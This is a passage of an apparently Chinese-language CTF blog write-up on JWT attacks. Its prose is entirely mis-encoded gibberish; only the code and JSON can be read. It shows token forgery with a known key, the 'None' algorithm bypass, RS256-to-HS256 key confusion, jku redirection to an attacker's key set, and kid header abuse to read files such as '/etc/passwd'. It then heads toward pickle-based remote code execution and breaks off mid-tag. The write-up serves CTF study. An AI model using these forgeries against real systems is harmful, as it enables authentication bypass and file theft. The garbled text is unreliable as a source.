å¯†ã€‚</p><p>ä½†æ˜¯å®é™…ä¸Šï¼Œå¤§å®¶å¯èƒ½æ³¨æ„åˆ°è¿‡ä¸€ä¸ªç°è±¡ï¼šjwtä¸­æ²¡æœ‰<code>/</code>,<code>=</code>è¿™ç§æœ¬è¯¥å‡ºç°åœ¨base64æ•°æ®ä¸­çš„å­—ç¬¦ã€‚è€Œåœ¨ä¹‹å‰æåˆ°è¿‡çš„æ¯”èµ›ä¸­ï¼Œæˆ‘ä¹Ÿæ˜¯é‡åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œå¹¶é€šè¿‡æ‰¾è§„å¾‹å‘ç°ï¼Œjwtæœ€ç»ˆçš„ç»“æœä¼šå°†åŸå§‹çš„base64å­—ç¬¦ä¸²ä¸­çš„<code>/</code>æ¢æˆ<code>_</code>ã€‚å¹¶ä¸”å»æ‰åŸæœ¬base64ä¸­ç”¨äºè¡¥ä½çš„<code>=</code>ã€‚</p><p>å®é™…ä¸Šï¼Œè¿™ç‚¹æˆ‘ä»¬å¯ä»¥ç”¨pythonçš„åº“ä¸­<code>base64.urlsafe_b64encode</code>æ›¿æ¢<code>base64encode</code>.ä¹Ÿå› æ­¤å¯ä»¥ç†è§£ï¼Œæ˜¯ä¸ºäº†ç½‘ç»œä¼ è¾“æ‰å¯¹è¿™å‡ ä¸ªç‰¹æ®Šå­—ç¬¦è¿›è¡Œäº†å¤„ç†ã€‚</p><p>è‡³äºå¦ä¸€ç§å¸¸è§çš„RS256ç®—æ³•ä¹Ÿæ˜¯ç›¸åŒçš„é“ç†ã€‚æœåŠ¡ç«¯éœ€è¦å­˜å‚¨ä¸€ç»„<code>publickey.pem</code>ä¸<code>privatekey.pem</code>.æˆ‘ä»¬éœ€è¦ç§é’¥ç”Ÿæˆtoken.æœåŠ¡ç«¯åˆ™ä¼šç”¨å…¬é’¥è§£å¯†tokenã€‚</p><h2 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h2><p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•åˆ©ç”¨æ¼æ´æ¸—é€jwtäº†ã€‚é¦–å…ˆéœ€è¦æ˜ç¡®ä¸¤ç‚¹</p><ul><li>æ˜¯å¦éœ€è¦åˆ©ç”¨jwtï¼Ÿ</li><li>æ˜¯å¦æœ‰å…¶ä»–æ¼æ´æ³„éœ²key?</li></ul><p>ä¹‹æ‰€ä»¥æåˆ°è¿™ä¸¤ç‚¹æ˜¯å› ä¸ºï¼šjwtæœ¬èº«å°±æ˜¯å› ä¸ºåªç”¨æœåŠ¡ç«¯å­˜å‚¨ä¸€ç»„keyæ¥å‡è½»å‹åŠ›è€Œè¯ç”Ÿçš„ã€‚æ˜¯å¯ä»¥ä½œä¸ºsessionidçš„æ›¿æ¢æ–¹æ¡ˆçš„ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸»æµçš„ç¼–ç¨‹è¯­è¨€python,java,Node.jséƒ½å¯ä»¥å¾ˆè½»æ¾çš„è°ƒç”¨jwt.å…¶ä»–è¯­è¨€å¦‚phpä¹Ÿæ”¯æŒã€‚è€ŒçœŸå®æƒ…å†µå¾€å¾€æ˜¯ä»–ä»¬è°ƒç”¨jwtæ¥å­˜å‚¨å¿…è¦çš„ç®€å•ç”¨æˆ·ä¿¡æ¯ï¼Œæ‰€ä»¥<strong>ä¸è¦è®¤ä¸ºjwtä¸€å®šæœ‰æ¼æ´å¯åˆ©ç”¨</strong></p><p>åŒæ—¶ï¼Œjwtçš„keyä¹Ÿæ˜¯éå¸¸å¤´ç–¼çš„ä¸€ä¸ªè¯é¢˜ã€‚å¦‚æœéœ€è¦è¶Šæƒï¼Œé‚£ä¹ˆå°±éœ€è¦ä¼ªé€ token.è€Œä¼ªé€ å¿…é¡»éœ€è¦keyæ¥ç­¾åï¼ˆæˆ–è€…æœåŠ¡ç«¯è„šæœ¬æ¼æ´ï¼‰ã€‚ä¹Ÿè®¸æ˜¯å—äº†å›½èµ›å½±å“ï¼Œjwtçš„keyæ˜¯ç”¨<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a>æš´ç ´çš„.è€Œå®é™…æƒ…å†µä¸‹ï¼Œkeyå¾ˆæœ‰å¯èƒ½éš¾ä»¥çˆ†ç ´ï¼Œæ‰€ä»¥æˆ‘è®¤ä¸ºæœ€ä½³æ–¹æ¡ˆæ˜¯å…ˆå»å¯»æ‰¾å¯èƒ½æ³„éœ²keyçš„æ–¹æ³•ã€‚</p><p>æ¯”å¦‚æŸæ¯”èµ›æˆ‘åœ¨getshellåï¼Œæ‰’ä¸‹æºç æ—¶é¡ºæ‰‹çœ‹äº†ä¸€çœ¼å®ƒæœåŠ¡ç«¯çš„keyï¼Œæ ¹æœ¬ä¸å¯èƒ½çˆ†ç ´<br><img src="/2020/06/24/Make-jwt-great-again/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>æ‰€ä»¥ï¼Œ<strong>å°è¯•å…¶ä»–æ–¹å¼æ¥è·å–key</strong>ã€‚è¿™ä¹Ÿæ­£æ˜¯æˆ‘ä¸‹é¢è¦æ€»ç»“çš„ï¼Œç”¨äºjwtçš„æ¼æ´åˆ©ç”¨ã€‚</p><h3 id="ä¿¡æ¯æ³„éœ²-ä¼ªé€ "><a href="#ä¿¡æ¯æ³„éœ²-ä¼ªé€ " class="headerlink" title="ä¿¡æ¯æ³„éœ²-ä¼ªé€ "></a>ä¿¡æ¯æ³„éœ²-ä¼ªé€ </h3><p>å¿…å¤‡ç½‘ç«™ï¼š<br><a href="http://jwt.io/" target="_blank" rel="noopener">http://jwt.io/</a><br>è¿™ä¹Ÿæ˜¯æ‰€æœ‰jwté¢˜ç›®ç¬¬ä¸€æ­¥å°±è¯¥åšçš„ã€‚å› ä¸ºå³ä½¿æ²¡æœ‰keyï¼Œæˆ‘ä»¬ä¹Ÿèƒ½æ¸…æ™°çš„å¾—åˆ°æ‰€æœ‰headerä¸payloadçš„ä¿¡æ¯ã€‚è€Œå¾€å¾€è¿™å†³å®šäº†æˆ‘ä»¬ä¸‹ä¸€æ­¥çš„ä¸¾æªã€‚</p><p>æ¯”å¦‚ï¼Œpayloadä¸­æœ‰usernameå­—æ®µã€‚é‚£ä¹ˆæˆ‘ä»¬æ˜¯å¦å¯ä»¥ä¼ªé€ adminæ¥è¿›è¡Œæƒé™æå‡å‘¢ï¼Ÿæˆ–è€…ï¼Œåº”ç”¨æœ‰æŸä¸ªå˜é‡å­—æ®µå–è‡ªjwt,é‚£ä¹ˆæˆ‘ä»¬å¦‚æœæœ‰äº†key.å°±å¯ä»¥ä½¿ç”¨jwt.ioæˆ–è€…pythonè„šæœ¬è¿›è¡Œä¼ªé€ äº†ã€‚</p><p>ä»¥ä»Šå¹´ç½‘é¼ç„æ­¦ç»„çš„js_onä¸ºä¾‹ã€‚å½“ä»¥å¼±å£ä»¤ç™»å½•adminæ—¶ï¼Œå°±å¯ä»¥å¾—åˆ°keyã€‚ä»è€Œä»»æ„æ”¹é€ å­˜åœ¨sqlæ³¨å…¥çš„å­—æ®µè¿›è¡Œç›²æ³¨ã€‚è¿™ä¹Ÿå°±è¦æ±‚æˆ‘ä»¬ä½¿ç”¨è„šæœ¬æ¥å®Œæˆæ”»å‡»ã€‚ä¸‹é¢ç»™å‡ºä¸€ä¸ªpythonè°ƒç”¨jwtåŸºæœ¬ç”¨æ³•</p><pre><code class="python">import jwtencoded_jwt = jwt.encode({&#39;user_name&#39;: &#39;admin&#39;}, &#39;secretkey&#39;, algorithm=&#39;HS256&#39;).decode(&#39;utf-8&#39;)print(encoded_jwt)</code></pre><p>æ³¨æ„pythonè°ƒç”¨jwtçš„åº“æ˜¯<code>PyJwt</code>ã€‚å¹¶ä¸”è¿˜æœ‰ä¸€ä¸ªå‘ç‚¹æ˜¯ï¼Œpythonæƒ³è¦ç”¨ç§é’¥ä½œä¸ºkeyï¼Œä¹Ÿå°±æ˜¯ä½¿ç”¨RS256ç®—æ³•åŠ å¯†æ—¶ä¼šæŠ¥é”™ã€‚ä¸çŸ¥é“æ˜¯å¦åªæœ‰æˆ‘å‡ºç°è¿™ä¸ªé—®é¢˜ã€‚å› æ­¤è¿˜æ˜¯å¾—ç”¨<code>jwt.io</code>è§£å†³</p><h3 id="None-algorithm"><a href="#None-algorithm" class="headerlink" title="None-algorithm"></a>None-algorithm</h3><p>jwtæ”¯æŒç©ºç®—æ³•ï¼Œä¹Ÿå°±æ˜¯<code>None</code>ã€‚åŸæœ¬åªæ˜¯ä¸ºäº†è°ƒè¯•ç”¨çš„ï¼Œä½†è¿™ä¸€æ—¦å‡ºç°åœ¨äº†æºç ä¸­å°†æ˜¯éå¸¸è‡´å‘½çš„ã€‚</p><p>æ¯”å¦‚ä¹‹å‰è™ç¬¦æ¯”èµ›çš„é¢˜ç›®ã€‚åº”è¯¥æ˜¯å€Ÿé‰´äº†å¤–å›½èµ›çš„ä¸€ä¸ªé¢˜ã€‚å…¶æºç æ˜¯è¿™æ ·çš„</p><pre><code class="javascript">let sid = JSON.parse(Buffer.from(cookie.split(&quot;.&quot;)[1], &#39;base64&#39;).toString()).secretid;if(sid==undefined||sid&gt;=secrets.length||sid&lt;0){throw &quot;invalid sid&quot;}let decoded = jwt.verify(cookie, secrets[sid]);if(decoded.perms==&quot;admin&quot;){    res.locals.flag = true;}</code></pre><p>å¯ä»¥å‘ç°ï¼Œå½“æ²¡æœ‰å¼ºè°ƒç®—æ³•ï¼Œç›´æ¥ä½¿ç”¨<code>jwt.verify()</code>æ—¶ï¼Œç”±äºkeyå¯æ§ï¼Œjwtæ˜¯å¯ä»¥ç”¨Noneç®—æ³•æ¥è§£tokençš„ã€‚è¿™ä¹Ÿå°±å¯¼è‡´äº†ç®€å•çš„è¶Šæƒã€‚<br>åŒç†ã€‚pythonçš„æºç å¦‚æœæ²¡æœ‰å¼ºè°ƒï¼Œä¹Ÿæ˜¯å­˜åœ¨ç©ºç®—æ³•ä¼ªé€ çš„ã€‚æ‰€ä»¥æœ‰æ—¶å€™ä¸å¦¨å°è¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹æ— ç®—æ³•èƒ½ä¸èƒ½é€šè¿‡æœåŠ¡ç«¯æ ¡éªŒï¼ˆæ²¡æœ‰æºç æ—¶ï¼‰</p><p>é€šå¸¸æ­¥éª¤å¦‚ä¸‹</p><pre><code class="python">import jwtjwtToken= &#39;eyJhbGciOiJIUzI1NiIsI...&#39;decodedToken= jwt.decode(jwtToken, verify=False)  # Need to decode the token before encoding with type &#39;None&#39;noneEncoded= jwt.encode(decodedToken, key=&#39;&#39;, algorithm=None)print(noneEncoded.decode())</code></pre><h3 id="RS256-to-HS256"><a href="#RS256-to-HS256" class="headerlink" title="RS256 to HS256"></a>RS256 to HS256</h3><p>ä»éå¯¹ç§°åˆ°å¯¹ç§°ç®—æ³•çš„ä¼ªé€ ã€‚å…¶å®éå¸¸æœ‰æ„æ€ä½†æ˜¯å›½å†…CTFéƒ½æ²¡æ€ä¹ˆè§åˆ°è¿‡ã€‚</p><p>ç›´æ¥ä¸ŠçœŸé¢˜æºç ï¼Œåº”è¯¥æ˜¯ä¹‹å‰HSCTFé‡Œé¢çš„</p><pre><code class="python">#ç”Ÿæˆtokenauth = jwt.encode({&quot;auth&quot;: &quot;guest&quot;}, PRIVATE_KEY, algorithm=&quot;RS256&quot;)#ç”¨tokenéªŒè¯èº«ä»½æ˜¯å¦ä¸ºadminadmin = jwt.decode(auth, PUBLIC_KEY)[&quot;auth&quot;] == &quot;admin&quot;</code></pre><p>ä¹ä¸€çœ‹æ²¡ä»€ä¹ˆæ¼æ´ã€‚ä½†æ˜¯å¦‚æœäº†è§£jwtï¼Œå°±ä¼šå‘ç°è¿™é‡Œå¯èƒ½å­˜åœ¨ä½¿ç”¨<code>HS256</code>æ›¿æ¢<code>RS256</code>çš„é£é™©ã€‚å‡å¦‚å…¬é’¥æ³„éœ²ï¼Œæˆ‘ä»¬å°±èƒ½ç”¨å…¬é’¥ä½œä¸ºkeyï¼Œä½¿ç”¨HS256ç”Ÿæˆtokené€šè¿‡æ ¡éªŒã€‚è¿™åŒæ ·æ˜¯æ²¡æœ‰å¼ºè°ƒç®—æ³•çš„é—®é¢˜ã€‚</p><p>ä¼ªé€ çš„è¯å¯ä»¥ç”¨python</p><pre><code class="python">import jwtpublic = open(&#39;public.pem&#39;, &#39;r&#39;).read()print(public)print(jwt.encode({&quot;data&quot;:&quot;test&quot;}, key=public, algorithm=&#39;HS256&#39;)).decode(&#39;utf-8&#39;)</code></pre><p>ä½†éœ€è¦æ³¨æ„ï¼Œè¿™é‡Œå¿…é¡»æ»¡è¶³pyjwt==0.4.3æ‰èƒ½ä¼ªé€ ã€‚å¦åˆ™åªèƒ½é‡‡ç”¨å…¶ä»–åŠæ³•äº†ã€‚è¿™é‡Œç›´æ¥ç»™å‡ºpayloadallthethingsé‡Œçš„é“¾æ¥<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signature---rs256-to-hs256" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token#jwt-signatureâ€”rs256-to-hs256</a></p><p>è€ŒNode.jsä¹Ÿå­˜åœ¨è¿™ç§é£é™©ã€‚æ‰€ä»¥è¯´jwtçš„å®‰å…¨é—®é¢˜ä¸»è¦å‡ºåœ¨å¼€å‘è€…æºç å†™çš„ä¸å¤Ÿå¥½çš„åŸå› ã€‚</p><h3 id="jku-jwk"><a href="#jku-jwk" class="headerlink" title="jku/jwk"></a>jku/jwk</h3><p>ä»¥ä¸Šéƒ½æ˜¯ç›¸å¯¹æ¯”è¾ƒå¸¸è§çš„æ¼æ´äº†ã€‚ç”šè‡³å›½å†…ctfè¿˜åªå‡ºç°è¿‡å‰ä¸¤ç§ã€‚è€ŒNahamconçš„æ¯”èµ›è®©æˆ‘äº†è§£åˆ°äº†å¦ä¸€ç§å­˜åœ¨çš„æ¼æ´ã€‚ä¸jkuç›¸å…³ã€‚</p><blockquote><p>JKUå…¨ç§°æ˜¯â€œJWKSet URLâ€ï¼Œå®ƒæ˜¯å¤´éƒ¨çš„ä¸€ä¸ªå¯é€‰å­—æ®µï¼Œç”¨äºæŒ‡å®šé“¾æ¥åˆ°ä¸€ç»„åŠ å¯†tokenå¯†é’¥çš„URLã€‚è‹¥å…è®¸ä½¿ç”¨è¯¥å­—æ®µä¸”ä¸è®¾ç½®é™å®šæ¡ä»¶ï¼Œæ”»å‡»è€…å°±èƒ½æ‰˜ç®¡è‡ªå·±çš„å¯†é’¥æ–‡ä»¶ï¼Œå¹¶æŒ‡å®šåº”ç”¨ç¨‹åºï¼Œç”¨å®ƒæ¥è®¤è¯tokenã€‚</p></blockquote><p>è€Œjwkå°±æ˜¯json web keyã€‚</p><p>å®é™…ä¸Šä½ èƒ½å‘ç°amazonå°±æœ‰ç›¸å…³çš„æ–‡æ¡£æ¥äº†è§£jkuã€‚<br><a href="https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/amazon-cognito-user-pools-using-tokens-verifying-a-jwt.html" target="_blank" rel="noopener">https://docs.aws.amazon.com/zh_cn/cognito/latest/developerguide/amazon-cognito-user-pools-using-tokens-verifying-a-jwt.html</a></p><p>å…¶ä¸­è¿˜æåˆ°äº†kidè¿™ä¸ªheaderé€‰é¡¹ã€‚å®ƒçš„ä½œç”¨æ˜¯è·å–å¯¹åº”çš„å­—æ®µä½œä¸ºkeyã€‚(jwkç±»å‹)</p><p>ä¸‹é¢æˆ‘ç”¨æ¯”èµ›ä¸­flagjokesè¿™é¢˜æ¥è®²è§£ä¸‹ï¼š</p><p>é¦–å…ˆè§£å‡ºjwt headerå¦‚ä¸‹ï¼Œè€Œæˆ‘ä»¬åªè¦payloadä¸­çš„usernameä¸ºadminå³å¯è·å¾—flagã€‚</p><pre><code>{  &quot;alg&quot;: &quot;RS256&quot;,  &quot;jku&quot;: &quot;http://localhost:5000/static/jwks.json&quot;,  &quot;kid&quot;: &quot;sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc&quot;}</code></pre><p>jkuæŒ‡å‘äº†æœ¬åœ°çš„ç½‘é¡µã€‚é‚£ä¹ˆå°è¯•ç›´æ¥è®¿é—®<br>å‘ç°ç½‘é¡µå­˜åœ¨static/jwks.json</p><pre><code>{    &quot;keys&quot;: [  {        &quot;e&quot;: &quot;AQAB&quot;,    &quot;kid&quot;: &quot;sqcE1a9gj9p08zNMR1MWbLLvuaPyUeJEsClBhy7Q4Jc&quot;,    &quot;kty&quot;: &quot;RSA&quot;,    &quot;n&quot;: &quot;1bVdpTILcGSahuOL6IJCbUpDZTGFHc8lzQORNLQBXDiRd1cC1k5cG41iR1TYh74cp8HYmoLXy4U2bp7GUFm0ip_qzCxcabUwWCxF07TGsmiFmCUbcQ6vbJvnSZSZGe-RFPgHxrVzHgQzepNIY2TmjgXyqt8HNuKBJQ6NoTviyxZUqy65KtSBfLYh5XzFn3FPemOla8kGBu7moSbUpgO1t3m3LgxBV5y51E1xSSoC7nAYPFrQ9wOTHEh7kGxGUQqKtGswyi2ncH22VcfQkxMA0HerFMPOr2n9eEZEbeJFco9Gp3drAYDCyj0QbkJKGdbl_50cimZ7eXgeyc3lEEXL7Q&quot;}    ]}</code></pre><p>æ­¤æ—¶æˆ‘å‘ç°å¾—åˆ°jwkåï¼Œå³å¯ç”Ÿæˆå…¬é’¥äº†ã€‚ä½†æ˜¯ç½‘ç«™åªæ³„éœ²äº†å…¬é’¥ï¼Œé‚£ä¹ˆæ ¹æ®ä¸Šé¢æ€»ç»“çš„ï¼Œèƒ½å°è¯•çš„åªèƒ½æ˜¯HS256æ›¿æ¢RS256ç”Ÿæˆtoken.<br>ç„¶è€Œå½“æ—¶å°è¯•äº†åå´å¾—åˆ°æœåŠ¡ç«¯çš„æŠ¥é”™ã€‚ä¹Ÿå°±æ˜¯è¯´å¹¶ä¸èƒ½æ›´æ¢ç®—æ³•æ¥ä¼ªé€ token.é‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿ</p><p>æ­¤æ—¶é€šè¿‡æŸ¥è¯¢ä¸€ç³»åˆ—èµ„æ–™ï¼Œç»ˆäºå‘ç°jkuçš„æŒ‡å®šæ˜¯æœ‰æ´çš„ã€‚å‡å¦‚æˆ‘ä»¬è®©å®ƒåŠ è½½åˆ°æˆ‘ä»¬è‡ªå·±çš„<code>jwk.json</code>ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿä»¥<code>RS256</code>ç®—æ³•è€Œä¸æ˜¯ä¼ªé€ <code>HS256</code>é€šè¿‡æ ¡éªŒäº†ã€‚</p><p>æ‰€ä»¥ï¼Œæ­£ç¡®æ€è·¯æ˜¯ç”³è¯·ä¸€ç»„keyï¼Œkidå¯ä»¥è‡ªå®š<br><a href="https://mkjwk.org/" target="_blank" rel="noopener">https://mkjwk.org/</a><br><img src="/2020/06/24/Make-jwt-great-again/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt><br>æˆ‘ä»¬å¯ä»¥åªæ”¾ä¸­é—´çš„ä½œä¸ºjwk.jsonï¼Œä¹Ÿå¯ä»¥æŠŠå³è¾¹çš„å…¬é’¥æ”¹æˆjwkçš„æ ¼å¼ã€‚</p><p>ä¹‹åå°±æ˜¯åœ¨çº¿æˆ–è€…ç”¨è„šæœ¬è¿›è¡Œjwk-&gt;pemçš„è½¬æ¢äº†ã€‚è¿™é‡Œè´´å‡ºä¸€ä¸ªNode.jsè¿›è¡Œè½¬æ¢çš„è„šæœ¬ã€‚</p><pre><code class="javascript">const jose = require(&#39;node-jose&#39;);const fs = require(&#39;fs&#39;);const args = process.argv.slice(2);const key = fs.readFileSync(args[0]);var DUMP_PRIVATE_KEY = (&#39;true&#39; == args[1]);jose.JWK.asKey(key)  .then(function(key) {    console.log(key.toPEM(DUMP_PRIVATE_KEY));  });</code></pre><p>ä½¿ç”¨æ—¶ å‘ç°<code>node test.js private.jwk</code>è·Ÿ <code>public.jwk</code>ä¸€è‡´ï¼Œè¯æ˜æ²¡æœ‰é—®é¢˜ã€‚æ­¤æ—¶åªéœ€ä½¿ç”¨<br><code>node test.js private.jwk TRUE</code>å³å¯è¾“å‡ºç§é’¥ç»“æœï¼Œå¦åˆ™è„šæœ¬è®¾è®¡ä¸Šæ˜¯é»˜è®¤ä¸è¾“å‡ºç§é’¥çš„ï¼ˆå±é™©ï¼‰ã€‚</p><p>å› æ­¤ã€‚æœ¬é¢˜å…³é”®æ˜¯æ›´æ”¹jkuè·å–åˆ°æˆ‘ä»¬è‡ªå·±çš„jsonã€‚è¿™æ ·æˆ‘ä»¬å¯ä»¥ç”¨ç§é’¥åŠ å¯†payload.æœåŠ¡ç«¯ç”¨è·å–åˆ°çš„å…¬é’¥è§£å¯†payload.</p><h3 id="kid-ä»»æ„æ–‡ä»¶"><a href="#kid-ä»»æ„æ–‡ä»¶" class="headerlink" title="kid-ä»»æ„æ–‡ä»¶"></a>kid-ä»»æ„æ–‡ä»¶</h3><p>kidçš„å«ä¹‰ä¸Šé¢å·²ç»æåˆ°è¿‡äº†ï¼šæŒ‡å®šjwtçš„å¯†é’¥ã€‚</p><p>kidå¯èƒ½å­˜åœ¨çš„é—®é¢˜ï¼Œåœ¨äº†è§£äº†ä¸Šé¢jkuçš„ç›¸å…³æ¼æ´åï¼Œåº”è¯¥ä¼šæ¯”è¾ƒæ¸…æ¥šäº†ã€‚å¦‚æœjwtæ˜¯é€šè¿‡headerä¸­çš„kidæ¥è·å–keyï¼Œé‚£ä¹ˆå°±å¯èƒ½é€ æˆä»»æ„æ–‡ä»¶è¯»å–ï¼ˆä¸ä¸€å®šæœ‰å›æ˜¾ï¼‰</p><p>ç®€å•çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æŒ‡å®škidä¸º2ï¼Œå³HS256çš„secretkeyä¸º2</p><pre><code class="json">{    &quot;alg&quot; : &quot;HS256&quot;,    &quot;typ&quot; : &quot;jwt&quot;,    &quot;kid&quot; : &quot;2&quot;}</code></pre><p>æˆ–è€…æœ‰çš„æ—¶å€™å®ƒæ˜¯ä»æ–‡ä»¶è·å–çš„</p><pre><code>&quot;kid&quot; : &quot;/etc/passwd&quot;</code></pre><p>å‡å¦‚æœ‰webåº”ç”¨æŠŠå¯†é’¥å›æ˜¾å‡ºæ¥ï¼ˆä¸å¤ªå¯èƒ½ï¼‰ï¼Œå³å¯è¯»å–æ–‡ä»¶ã€‚<br>åŒæ—¶è¿˜æœ‰ä¸€ç§æ€è·¯ã€‚ç”±äºå¯ä»¥æŒ‡å®šä»»æ„æ–‡ä»¶ï¼Œåªè¦æ‰¾åˆ°å¯æ§çš„keyã€‚æˆ‘ä»¬å°±èƒ½åšåˆ°ä¼ªé€ jwttokenã€‚</p><p>æ¯”å¦‚æŒ‡å®šé™æ€cssæ–‡ä»¶ï¼Œå®ƒçš„æ–‡ä»¶å†…å®¹ä¸€å®šæ˜¯å¯æ§çš„ï¼Œä¸”æ˜“äºä»ç½‘é¡µè·å–çš„ã€‚</p><pre><code>&quot;kid&quot; : &quot;/css/public.css&quot;</code></pre><p>ä¸‹é¢å°±NahamconCTFçš„Bâ€™omarr Styleæ¥åˆ†æä¸‹<br>è¿™é¢˜å› ä¸ºèŠ±äº†æˆ‘ä¸å°‘æ—¶é—´ã€‚ä½†æ˜¯ä»ç„¶å­¦åˆ°äº†éå¸¸å¤šä¸œè¥¿ï¼Œæ‰€ä»¥ç‰¹åœ°å†™ä¸‹ã€‚èµ›åæˆ‘ä¹Ÿä¸€æ—¶å…´èµ·å†™äº†ç¯‡è‹±æ–‡wpæŠ•CTFTimeä¸Šäº†<a href="https://hackmd.io/@byc404/B1VBX8Qp8" target="_blank" rel="noopener">https://hackmd.io/@byc404/B1VBX8Qp8</a><br>ä¸‹é¢æˆ‘ç›¸å½“äºè¡¥ä¸€ä»½ä¸­æ–‡wp:</p><p>é¦–å…ˆæ˜¯é¢˜ç›®æ³¨å†Œï¼Œç™»å½•åçš„token<br><img src="/2020/06/24/Make-jwt-great-again/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>é‡ç‚¹åŒæ ·åœ¨äºjwtçš„header</p><pre><code>{  &quot;typ&quot;: &quot;JWT&quot;,  &quot;alg&quot;: &quot;HS256&quot;,  &quot;kid&quot;: &quot;secret.txt&quot;}</code></pre><p>ä»headerä¿¡æ¯ä¸­ã€‚æˆ‘ä»¬å¯ä»¥æ¨æ–­å‡ºï¼Œjwtçš„keyæ˜¯ä»secret.txtè¿™ä¸ªæ–‡ä»¶ä¸­è·å–çš„ã€‚</p><p>ä½†æ˜¯éå¸¸å¥‡æ€ªçš„æ˜¯ï¼Œåœ¨æ²¡æœ‰keyçš„æƒ…å†µä¸‹,<code>jwt.io</code>è§£å‡ºæ¥çš„payloadå†…å®¹ä¸ºç©ºã€‚</p><p>è¿™é‡Œå¯èƒ½å°±éœ€è¦ä¸€ç‚¹çœ¼åŠ›äº†ï¼Œå› ä¸ºè‡ªå·±åšè¿‡å¥½å‡ é“pickleç›¸å…³çš„åºåˆ—åŒ–é¢˜ï¼Œæ‰€ä»¥è¿™é‡Œä¸éš¾ç›´æ¥çœ‹å‡ºï¼Œjwtçš„payloadéƒ¨åˆ†è¢«æ›¿æ¢æˆäº†pickleç”Ÿæˆçš„åºåˆ—åŒ–base64å†…å®¹ã€‚æˆ–è€…æˆ‘ä»¬ä¹Ÿå¯ä»¥å•ç‹¬æ‹¿å‡ºè¿™ä¸€æ®µå¥‡æ€ªçš„base64ç”¨xxdçœ‹<br><img src="/2020/06/24/Make-jwt-great-again/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p><p>èƒ½å¤Ÿæ˜æ˜¾çœ‹åˆ°<code>c_mamin</code>,<code>username</code>ç­‰å­—æ ·ã€‚è¿™å°±æ˜¯å…¸å‹çš„python opcodeçš„å†…å®¹</p><p>æ‰€ä»¥è¿™é‡Œæˆ‘æ˜ç¡®äº†é¢˜ç›®çš„è¦æ±‚ï¼šä¼ªé€ ä¸€ä¸ªæœ‰æ•ˆtoken,åŒ…å«æˆ‘ä»¬æ¶æ„çš„pythonåºåˆ—åŒ–å†…å®¹ï¼Œè¿›è¡ŒRCEã€‚</p><p>ç„¶è€Œè¿™åªæ˜¯ç¬¬ä¸€æ­¥ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ä¼šå‘ç°ï¼Œsecret.txtå†…å®¹æœªçŸ¥ï¼Œè€Œæƒ³è¦è·å–keyå¹¶æ²¡æœ‰å…¶ä»–é€”å¾„ã€‚é‚£ä¹ˆé¦–å…ˆæˆ‘å…ˆå°è¯•<code>None</code>ç®—æ³•è¯•è¯•å§ã€‚</p><p>å°è¯•åå‘ç°åªæ¥å—HS256.çœ‹æ¥é‡ç‚¹æ˜¯ï¼Œå¯»æ‰¾åˆ°ä¸€ä¸ªå¯æ§çš„keyã€‚</p><p>æ­¤å¤„çš„kidè¡¨ç¤ºæˆ‘ä»¬å¯ä»¥æŒ‡å®šä»»æ„æ–‡ä»¶ä½œä¸ºå¯†é’¥ï¼Œä½†è¿™ä¹Ÿæ˜¯ä¸€å¤§éš¾ç‚¹ã€‚å› ä¸ºæ­¤é¢˜æ˜¯pythonç¯å¢ƒï¼Œå…¶é™æ€æ–‡ä»¶åŸºæœ¬æ²¡æœ‰å¯æ§çš„ã€‚å®ƒçš„htmlæ ¼å¼æ˜¯å…¸å‹çš„ç›´æ¥ä»cdnè·å–cssçš„<br><img src="/2020/06/24/Make-jwt-great-again/4.PNG" class="lazyload" data-srcset="4.PNG" 